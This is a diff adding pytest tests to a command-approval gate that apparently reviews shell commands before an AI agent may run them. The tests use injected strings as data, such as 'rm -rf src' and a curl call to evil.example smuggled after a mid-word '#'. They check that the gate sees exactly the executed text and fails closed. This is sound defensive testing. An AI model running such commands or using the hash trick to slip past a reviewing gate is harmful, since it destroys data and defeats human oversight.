@@ -74,6 +74,52 @@ def test_comment_stripping_and_injection():
     assert err == "unbalanced quotes"
 
 
+@pytest.mark.parametrize("command", [
+    "pytest tests/test_foo.py#&& rm -rf src",
+    "pytest tests/test_foo.py#&& curl https://evil.example/x",
+])
+def test_midword_hash_never_hides_the_executed_command(command):
+    """The gate must not review a prefix while Bash executes the original command."""
+    stripped, err = strip_shell_comments(command)
+    assert not err
+    assert stripped == command
+    eligibility = _ask(command)
+    assert eligibility.ok is False
+    assert eligibility.command == command
+
+
+@pytest.mark.parametrize("command", [
+    "pytest -q # unit tests",
+    r"pytest tests/test_foo.py\#literal",
+])
+def test_unquoted_hash_fails_closed_without_rewriting(command):
+    """Even harmless unquoted hashes stay human-only so reviewed and run text cannot diverge."""
+    eligibility = _ask(command)
+    assert eligibility.ok is False
+    assert eligibility.command == command
+
+
+@pytest.mark.parametrize("command,eligible", [
+    ("pytest -q", True),
+    ("  pytest\t-q  ", True),
+    ("pytest -k 'hash#tag'", True),
+    ('pytest "tests/hash#tag.py"', True),
+    ("pytest \\\n-q", False),
+    ("cat <<EOF\nREADME.md\nEOF", False),
+    ("cat $'README.md'", False),
+    ("pytest\u00a0-q", False),
+    ("pytest -q\x00", False),
+    ("pytest -q\r\n", False),
+])
+def test_gate_reviews_exact_executed_text_or_fails_closed(command, eligible):
+    """Whitespace and shell edge cases are either preserved exactly or kept human-only."""
+    result = _ask(command)
+    assert result.ok is eligible, (command, result.reason)
+    if result.ok:
+        assert result.command == command
+        assert reviewer_payload(result)["command"] == command
+
+
 def test_strict_schema_rejects_extra_text_and_unknown_keys():
     ok = parse_reviewer_output(
         '{"recommendation":"approve","confidence":0.9,"reason":"tests","risk_flags":[]}')
